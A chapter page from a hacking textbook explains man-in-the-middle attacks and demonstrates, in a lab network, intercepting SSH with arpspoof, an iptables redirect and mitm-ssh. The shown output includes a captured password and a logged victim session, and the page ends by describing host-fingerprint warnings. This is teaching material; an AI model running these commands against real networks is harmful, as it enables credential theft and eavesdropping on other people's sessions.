<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x751 Man-in-the-Middle Attacks</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part178.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part180.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark164">0x751 Man-in-the-Middle Attacks</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">A <span class="s27">man-in-the-middle (MitM) attack </span>is a clever way to circumvent encryption. The attacker sits between the two communicating parties, with each party believing they are communicating with the other party, but both are com- municating with the attacker.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">When an encrypted connection between the two parties is established, a secret key is generated and transmitted using an asymmetric cipher. Usually, this key is used to encrypt further communication between the two parties. Since the key is securely transmitted and the subsequent traffic is secured by the key, all of this traffic is unreadable by any would-be attacker sniffing these packets.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 106%;text-align: left;">However, in an MitM attack, party A believes that she is communicating with B<span class="s27">, </span>and party B believes he is communicating with A<span class="s27">, </span>but in reality, both are communicating with the attacker. So, when A negotiates an encrypted connection with B<span class="s27">, </span>A is actually opening an encrypted connection with the attacker, which means the attacker securely communicates with an asymmetric cipher and learns the secret key. Then the attacker just needs to open another encrypted connection with B<span class="s27">, </span>and B will believe that he is communicating with A<span class="s27">, </span>as shown in the following illustration.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s118" style="padding-left: 92pt;text-indent: 0pt;text-align: left;">Appears to be System A</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s118" style="padding-left: 35pt;text-indent: 0pt;text-align: left;">Appears to be System B</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="5" height="104" alt="image" src="Image_1221.png"/></span></p><p class="s119" style="padding-top: 10pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">Attacker</p><p style="text-indent: 0pt;text-align: left;"/><p class="s79" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">Encrypted Communication with Key 2</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s79" style="text-indent: 0pt;text-align: left;">Encrypted Communication with Key 1</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="104" height="5" alt="image" src="Image_1222.png"/></span></p><p class="s119" style="padding-top: 10pt;padding-left: 15pt;text-indent: 0pt;text-align: left;">System A</p><p style="text-indent: 0pt;text-align: left;"/><p class="s99" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">Systems A and B both believe they are communicating with each other.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s119" style="padding-top: 10pt;padding-left: 16pt;text-indent: 0pt;text-align: left;">System B</p><p style="padding-left: 92pt;text-indent: 0pt;text-align: left;"/><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This means that the attacker actually maintains two separate encrypted communication channels with two separate encryption keys. Packets from A are encrypted with the first key and sent to the attacker, which A believes is actually B. The attacker then decrypts these packets with the first key and re-encrypts them with the second key. Then the attacker sends the newly encrypted packets to B, and B believes these packets are actually being sent</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">by A. By sitting in the middle and maintaining two separate keys, the attacker is able to sniff and even modify traffic between A and B without either side being the wiser.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">After redirecting traffic using an ARP cache poisoning tool, there are a number of SSH man-in-the-middle attack tools that can be used. Most of these are just modifications to the existing openssh source code. One notable example is the aptly named mitm-ssh package, by Claes Nyberg, which has been included on the LiveCD.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;"><a href="part91.htm#bookmark102" class="a">This can all be done with the ARP redirection technique from “Active Sniffing” on page </a>239 and a modified openssh package aptly called mitm- ssh. There are other tools that do this; however, Claes Nyberg’s mitm-ssh is publicly available and the most robust. The source package is on the LiveCD in /usr/src/mitm-ssh, and it has already been built and installed. When running, it accepts connections to a given port and then proxies these connections to the real destination IP address of the target SSH server. With the help of arpspoof to poison ARP caches, traffic to the target SSH server can be redirected to the attacker’s machine running mitm-ssh. Since this program listens on localhost, some IP filtering rules are needed to redirect the traffic.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">In the example below, the target SSH server is at 192.168.42.72. When mitm-ssh is run, it will listen on port 2222, so it doesn’t need to be run as root. The iptables command tells Linux to redirect all incoming TCP con- nections on port 22 to localhost 2222, where mitm-ssh will be listening.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1223.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~ $ sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222 reader@hacking:~ $ sudo iptables -t nat -L</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Chain PREROUTING (policy ACCEPT)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">target   prot opt source       destination</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">REDIRECT  tcp -- anywhere      anywhere     tcp dpt:ssh redir ports 2222</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Chain POSTROUTING (policy ACCEPT)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">target   prot opt source       destination</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Chain OUTPUT (policy ACCEPT)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">target   prot opt source       destination reader@hacking:~ $ mitm-ssh</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">..</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">/|\  SSH Man In The Middle [Based on OpenSSH_3.9p1]</p><p style="padding-left: 19pt;text-indent: 0pt;text-align: left;"><a href="mailto:cmn@darklab.org" class="s81" target="_blank">_|_  By CMN &lt;cmn@darklab.org&gt;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 214%;text-align: left;">Usage: mitm-ssh &lt;non-nat-route&gt; [option(s)] Routes:</p><p class="s31" style="padding-top: 2pt;padding-left: 27pt;text-indent: 0pt;text-align: left;">&lt;host&gt;[:&lt;port&gt;] - Static route to port on host</p><p class="s31" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">(for non NAT connections)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Options:</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-v     - Verbose output</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-n      - Do not attempt to resolve hostnames</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-d     - Debug, repeat to increase verbosity</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-p port    - Port to listen for connections on</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-f configfile - Configuration file to read</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Log Options:</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-c logdir   - Log data from client in directory</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-s logdir   - Log data from server in directory</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-o file   - Log passwords to file</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222 Using static route to 192.168.42.72:22</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">SSH MITM Server listening on 0.0.0.0 port 2222. Generating 768 bit RSA key.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">RSA key generation complete.</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1224.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Then in another terminal window on the same machine, Dug Song’s arpspoof tool is used to poison ARP caches and redirect traffic destined for 192.168.42.72 to our machine, instead.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1225.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~ $ arpspoof Version: 2.3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Usage: arpspoof [-i interface] [-t target] host reader@hacking:~ $ sudo arpspoof -i eth0 192.168.42.72</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1226.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">And now the MitM attack is all set up and ready for the next unsus- pecting victim. The output below is from another machine on the network (192.168.42.250), which makes an SSH connection to 192.168.42.72.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">On Machine 192.168.42.250 (tetsuo), Connecting to 192.168.42.72 (loki)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1227.png"/></span></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a href="mailto:jose@192.168.42.72" class="s81" target="_blank">iz@tetsuo:~ $ ssh jose@192.168.42.72</a></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">The authenticity of host &#39;192.168.42.72 (192.168.42.72)&#39; can&#39;t be established. RSA key fingerprint is 84:7a:71:58:0f:b5:5e:1b:17:d7:b5:9c:81:5a:56:7c.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Are you sure you want to continue connecting (yes/no)? yes</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Warning: Permanently added &#39;192.168.42.72&#39; (RSA) to the list of known hosts. jose@192.168.42.72&#39;s password:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Last login: Mon Oct 1 06:32:37 2007 from 192.168.42.72</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Linux loki 2.6.20-16-generic #2 SMP Thu Jun 7 20:19:32 UTC 2007 i686</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">jose@loki:~ $ ls -a</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">. .. .bash_logout .bash_profile .bashrc .bashrc.swp .profile Examples jose@loki:~ $ id</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">uid=1001(jose) gid=1001(jose) groups=1001(jose) jose@loki:~ $ exit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">logout</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">Connection to 192.168.42.72 closed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">iz@tetsuo:~ $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1228.png"/></span></p><p style="padding-top: 6pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">Everything seems okay, and the connection appeared to be secure.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">However, the connection was secretly routed through the attacker’s machine, which used a separate encrypted connection to back to the target server. Back on the attacker’s machine, everything about the connection has been logged.</p><p class="s40" style="padding-top: 9pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">On the Attacker’s Machine</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1229.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~ $ sudo mitm-ssh 192.168.42.72 -v -n -p 2222 Using static route to 192.168.42.72:22</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">SSH MITM Server listening on 0.0.0.0 port 2222. Generating 768 bit RSA key.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">RSA key generation complete.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">WARNING: /usr/local/etc/moduli does not exist, using fixed modulus</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[MITM] Found real target 192.168.42.72:22 for NAT host 192.168.42.250:1929 [MITM] Routing SSH2 192.168.42.250:1929 -&gt; 192.168.42.72:22</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[2007-10-01 13:33:42] MITM (SSH2) 192.168.42.250:1929 -&gt; 192.168.42.72:22</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">SSH2_MSG_USERAUTH_REQUEST: jose ssh-connection password 0 sP#byp%srt</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[MITM] Connection from UNKNOWN:1929 closed reader@hacking:~ $ ls /usr/local/var/log/mitm-ssh/ passwd.log</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ssh2 192.168.42.250:1929 &lt;- 192.168.42.72:22</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ssh2 192.168.42.250:1929 -&gt; 192.168.42.72:22</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~ $ cat /usr/local/var/log/mitm-ssh/passwd.log</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[2007-10-01 13:33:42] MITM (SSH2) 192.168.42.250:1929 -&gt; 192.168.42.72:22</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">SSH2_MSG_USERAUTH_REQUEST: jose ssh-connection password 0 sP#byp%srt</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~ $ cat /usr/local/var/log/mitm-ssh/ssh2* Last login: Mon Oct 1 06:32:37 2007 from 192.168.42.72</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Linux loki 2.6.20-16-generic #2 SMP Thu Jun 7 20:19:32 UTC 2007 i686 jose@loki:~ $ ls -a</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">. .. .bash_logout .bash_profile .bashrc .bashrc.swp .profile Examples jose@loki:~ $ id</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">uid=1001(jose) gid=1001(jose) groups=1001(jose) jose@loki:~ $ exit</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">logout</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1230.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 106%;text-align: left;">Since the authentication was actually redirected, with the attacker’s machine acting as a proxy, the password <span class="s27">sP#byp%srt </span>could be sniffed. In addition, the data transmitted during the connection is captured, showing the attacker everything the victim did during the SSH session.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The attacker’s ability to masquerade as either party is what makes this type of attack possible. SSL and SSH were designed with this in mind and have protections against identity spoofing. SSL uses certificates to validate identity, and SSH uses host fingerprints. If the attacker doesn’t have the proper certificate or fingerprint for B when A attempts to open an encrypted</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">communication channel with the attacker, the signatures won’t match and A will be alerted with a warning.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">In the previous example, 192.168.42.250 (tetsuo) had never previously communicated over SSH with 192.168.42.72 (loki) and therefore didn’t have a host fingerprint. The host fingerprint that it accepted was actually the fingerprint generated by mitm-ssh. If, however, 192.168.42.250 (tetsuo) had a host fingerprint for 192.168.42.72 (loki), the whole attack would have been detected, and the user would have been presented with a very blatant warning:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1231.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;"><a href="mailto:jose@192.168.42.72" class="s81" target="_blank">iz@tetsuo:~ $ ssh </a>jose@192.168.42.72 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @  WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!  @</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Someone could be eavesdropping on you right now (man-in-the-middle attack)! It is also possible that the RSA host key has just been changed.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The fingerprint for the RSA key sent by the remote host is 84:7a:71:58:0f:b5:5e:1b:17:d7:b5:9c:81:5a:56:7c.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Please contact your system administrator.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Add correct host key in /home/jon/.ssh/known_hosts to get rid of this message. Offending key in /home/jon/.ssh/known_hosts:1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">RSA host key for 192.168.42.72 has changed and you have requested strict checking. Host key verification failed.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">iz@tetsuo:~ $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1232.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 107%;text-align: left;">The openssh client will actually prevent the user from connecting until the old host fingerprint has been removed. However, many Windows SSH clients don’t have the same kind of strict enforcement of these rules and will present the user with an “Are you sure you want to continue?” dialog box. An uninformed user might just click right through the warning.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part178.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part180.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
